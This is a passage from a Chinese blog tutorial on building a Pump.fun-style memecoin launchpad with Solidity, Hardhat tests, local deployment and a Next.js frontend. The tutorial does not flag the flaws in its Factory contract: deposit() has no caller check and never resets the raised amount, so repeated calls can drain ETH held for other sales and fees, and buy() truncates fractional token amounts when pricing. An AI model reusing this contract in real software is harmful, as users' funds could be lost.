class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">    <span class="comment">//确保交易完成，再执行后续代码</span></span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123; factory, token, creator, buyer&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Buying&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;1&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="comment">//buyer买token，将ETH转入到合约中，检查合约收到的ETH</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//buyer买token，检查buyer收到的token</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token balance&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;token, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(buyer.<span class="property">address</span>);</span><br><span class="line">            <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//更新token sale</span></span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should update token sale&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">sold</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">AMOUNT</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">raised</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">COST</span>);</span><br><span class="line">            <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&quot;Should increase base cost&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; factory, token &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line">            <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">            <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(sale.<span class="property">sold</span>);</span><br><span class="line">            <span class="comment">//sold为10000,带入getCost计算 0.0001 + 0.0001 = 0.0002</span></span><br><span class="line">            <span class="title function_">expect</span>(cost).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.0002&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>对于<code>buyTokenFixture</code>函数：</p><p>该函数部署一个合约，并使用<code>buyer</code>用户购买<code>token</code>，输入购买的数量<code>AMOUNT</code>和转入的费用<code>COST</code>，完成<code>token</code>的购买。</p><p>购买逻辑部分测试：</p><p>（1）核对购买<code>token</code>后的合约资金</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"><span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"><span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br></pre></td></tr></table></figure><p><code>ethers.provider.getBalance</code>获取合约的资金数量，判断是否等于<code>FEE + COST</code>。创建<code>token</code>转入<code>factory</code>合约<code>FEE</code>，购买<code>token</code>又花费了<code>COST</code>，最后合约的资金为<code>FEE + COST</code>。</p><p>（2）核对<code>buyer</code>的<code>token</code>数量是否正确，见代码。</p><p>（3）核对<code>token</code>的售卖信息，见代码。</p><p>（4）核对销售的价格是否符合逻辑。基本单位为<code>ether</code>，<code>1 ether</code> 等于<code>1后面18个0</code>。销售的数量为<code>10000 ether</code>，带入到<code>getCost</code>函数可得，购买的价格应该为<code>0.0002</code> ETH。</p><h3 id="Deposit函数-资金管理">Deposit函数(资金管理)</h3><h4 id="函数代码-3">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function deposit(address _token) external&#123;</span><br><span class="line">    //代币销售结束后资金结算的逻辑</span><br><span class="line">    //剩余的tokens 和 ETH转给creator</span><br><span class="line">    Token token = Token(_token);</span><br><span class="line">    TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span class="line">    require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">    //将Factory合约持有的代币转移给creator</span><br><span class="line">    token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">    //将筹集的ETH全部转移creator</span><br><span class="line">    (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">    require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数是<code>external</code>的，只能从合约的外部调用，其主要功能为<code>token</code>销售结束后的资金结算。</p><p>函数传入的参数为<code>_token</code>，即<code>token</code>的地址。利用<code>token</code>的地址获取到<code>token</code>的销售信息，只有当<code>token</code>达到销售的预期后才进行资金的清算，即代码中的<code>sale.isOpen == false</code>。然后将<code>factory</code>合约持有的<code>token</code>全部转给<code>creator</code>。最后再把<code>factory</code>筹集的<code>ETH</code>也全部转给<code>creator</code>。</p><h4 id="合约测试-3">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Depositing&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;2&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Sale should be closed and successful deposits&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, token, creator, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Buy tokens again to reach the target</span></span><br><span class="line">        <span class="keyword">const</span> buyTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">        <span class="keyword">await</span> buyTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> depositTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">deposit</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="keyword">await</span> depositTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(creator.<span class="property">address</span>);</span><br><span class="line">        <span class="comment">//console.log(balance);</span></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;980000&quot;</span>,<span class="number">18</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于存款逻辑测试：</p><p>（1）调用<code>loadFixture(buyTokenFixture);</code>函数获取相关用户和<code>token</code>。注意这里是调用了<code>buyTokenFixture</code>，在<code>buyTokenFixture</code>函数中<code>buyer</code>已经购买了<code>10000 ether</code>的<code>token</code>，并向<code>factory</code>合约中转入了<code>1 ether</code>。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217130455947.png" alt="image-20250217130455947"></p><p>（2）在此<code>Depositing</code>测试中<code>buyer</code>又再次购买了<code>10000 ether</code>的<code>token</code>，并向合约中转入了<code>2 ether</code>。</p><p>（3）检查<code>token</code>的销售信息。因为先后向<code>factory</code>合约中一共转入了<code>3 ether</code>，达到了目标，<code>sale.isOpen</code>被赋值了<code>false</code>。所以测试中，<code>sale.isOpen</code>是为<code>false</code>的。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217131220117.png" alt="image-20250217131220117"></p><p>（4）达到<code>token</code>的售卖目标后，将<code>factory</code>剩余的<code>token</code>全部转移为<code>creator</code>。因为一共购买了<code>20000 ether</code>，一共铸造了<code>1000000 ether</code>的<code>token</code>，故转移给<code>creator</code>的<code>token</code>的数量应该为<code>980000 ether</code>。所以测试中<code>creator</code>的<code>token</code>数量为<code>980000 ether</code>。</p><h3 id="Withdraw函数-合约资金回撤">Withdraw函数(合约资金回撤)</h3><h4 id="函数代码-4">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) external&#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line"></span><br><span class="line">    (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约函数传入的参数为<code>_amount</code>，即要转移的资金数量，其功能是将一定数量的合约资金转给合约的拥有者<code>owner</code>。</p><p>首先，判断<code>msg.sender</code>是否为<code>owner</code>，即调用<code>withdraw</code>合约函数的地址是否为<code>owner</code>。只有合约的<code>owner</code>才能管理合约中的资金。该函数的第一步即验证权限，确定要为<code>owner</code>。确认<code>owner</code>的身份后，调用转账函数，将合约的<code>_amount</code>数量的资金转移给<code>owner</code>。</p><h4 id="合约测试-4">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Withdrawing Fee&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//部署合约，提交了FEE</span></span><br><span class="line">    <span class="comment">//然后再将FEE进行撤回</span></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balances&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, deployer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(deployer).<span class="title function_">withdraw</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>合约资金回撤测试：</p><p>（1）首先，<code>deployer</code>调用<code>loadFixture(deployFactoryFixture)</code>函数进行<code>factory</code>合约的部署，合约部署时，会创建第一个<code>token</code>，并转入创建的<code>FEE</code>。此时<code>factory</code>合约的<code>owner</code>为<code>deployer</code>，<code>factory</code>合约的资金数为<code>FEE</code>。</p><p>（2）<code>deployer</code>调用<code>factory</code>合约的<code>withdraw</code>函数进行合约资金的回撤。</p><p>（3）最后测试，回撤资金成功后，<code>factory</code>合约的资金变为0。</p><h3 id="完整合约代码">完整合约代码</h3><p>完整的<code>Factory.sol</code>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;Token&#125; from &quot;./Token.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    uint256 public constant TARGET = 3 ether;</span><br><span class="line">    uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">    //交易费费用</span><br><span class="line">    uint256 public immutable fee;</span><br><span class="line">    //合约的部署者</span><br><span class="line">    address public owner;</span><br><span class="line">    //token数组</span><br><span class="line">    address[] public tokens;</span><br><span class="line">    //token总共的数量</span><br><span class="line">    uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">    //将token的地址映射到token售卖信息的结构体上</span><br><span class="line">    mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">    //创建一个售卖token的结构体</span><br><span class="line">    struct TokenSale&#123;</span><br><span class="line">        address token;</span><br><span class="line">        string name;</span><br><span class="line">        address creator;</span><br><span class="line">        uint256 sold;</span><br><span class="line">        uint256 raised;</span><br><span class="line">        bool isOpen;</span><br><span class="line">    &#125;</span><br><span class="line">    //当创建一个token时，发生了一个Created事件</span><br><span class="line">    event Created(address indexed token);</span><br><span class="line">    //当购买一个token时，发生一个Buy事件</span><br><span class="line">    event Buy(address indexed token, uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _fee) &#123;</span><br><span class="line">        fee = _fee;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //通过token在token数组中的下标_index，来获取token的售卖信息</span><br><span class="line">    function getTokenSale(uint256 _index) public view returns (TokenSale memory) &#123;</span><br><span class="line">        return tokenToSale[tokens[_index]];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">        uint256 floor = 0.0001 ether;</span><br><span class="line">        uint256 step = 0.0001 ether;</span><br><span class="line">        uint256 increment = 10000 ether;</span><br><span class="line">        uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">        return cost;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">        //确保创建者的余额大于fee，否则报错不向下继续执行。</span><br><span class="line">        require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line">        </span><br><span class="line">        //创建一个token</span><br><span class="line">        Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">        //tokens数组存储token</span><br><span class="line">        tokens.push(address(token));</span><br><span class="line">        //token计数</span><br><span class="line">        totalTokens ++;</span><br><span class="line">        //列出用于售卖的token</span><br><span class="line">        // address token;</span><br><span class="line">        // string name;</span><br><span class="line">        // address creator;</span><br><span class="line">        // uint256 sold;</span><br><span class="line">        // uint256 raised;</span><br><span class="line">        // bool isOpen;</span><br><span class="line">        TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">        tokenToSale[address(token)] = sale;</span><br><span class="line">        //触发Created事件，通知token被创建了。</span><br><span class="line">        emit Created(address(token));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">        TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">        //检查条件</span><br><span class="line">        require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">        require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">        require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">        //计算一个token的价格基于购买的总量</span><br><span class="line">        uint256 cost = getCost(sale.sold);</span><br><span class="line">        uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">        //确保足够的ETH发送</span><br><span class="line">        require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">        //更新sale</span><br><span class="line">        sale.sold += _amount;</span><br><span class="line">        sale.raised += price;</span><br><span class="line">        //判断筹集目标是否达成</span><br><span class="line">        if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">            //关闭销售</span><br><span class="line">            sale.isOpen = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">        //触发Buy事件</span><br><span class="line">        emit Buy(_token, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _token) external&#123;</span><br><span class="line">        //代币销售结束后资金结算的逻辑</span><br><span class="line"></span><br><span class="line">        //剩下的token余额和增加的ETH</span><br><span class="line">        //会进入像uniswap v3那样的流动性池</span><br><span class="line">        //为了简单起见，我们只转移剩余的部分</span><br><span class="line">        //剩余的tokens 和 ETH转给creator</span><br><span class="line">        Token token = Token(_token);</span><br><span class="line">        TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span class="line">        require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">        //将Factory合约持有的代币转移给creator</span><br><span class="line">        token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        //将筹集的ETH全部转移creator</span><br><span class="line">        (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) external&#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line">        </span><br><span class="line">        (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="本地部署合约">本地部署合约</h2><p>在<code>/FUN-PUMP/ignition/modules/</code>目录下，创建<code>Factory.js</code>，进行合约的部署，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; buildModule &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-ignition/modules&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">buildModule</span>(<span class="string">&quot;FactoryModule&quot;</span>, <span class="function">(<span class="params">m</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> fee = m.<span class="title function_">getParameter</span>(<span class="string">&quot;fee&quot;</span>, <span class="variable constant_">FEE</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> factory = m.<span class="title function_">contract</span>(<span class="string">&quot;Factory&quot;</span>, [fee]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; factory &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>首先启动本地的区块链。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p>然后，进行合约部署</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145430869.png" alt="image-20250217145430869"></p><p>成功部署。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145456776.png" alt="image-20250217145456776"></p><p>如果已经部署了合约，需要重置合约</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost --reset</span><br></pre></td></tr></table></figure><h2 id="前端">前端</h2><p>本地测试，使用<code>next.js</code>渲染前端的界面，前端使用<code>React</code>库用作前端界面展示。前端执行<code>javascript</code>和部署在区块链上的<code>factory</code>合约进行交互，返回结果，前端进行展示。</p><p>启动<code>next.js</code>，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217150831503.png" alt="image-20250217150831503"></p><h3 id="Metamask导入本地用户">Metamask导入本地用户</h3><p>点击添加账户，导入账户。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154415563.png" alt="image-20250217154415563"></p><p>本地区块链启动时，会有几个测试账户，导入私钥即可。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154636893.png" alt="image-20250217154636893"></p><h3 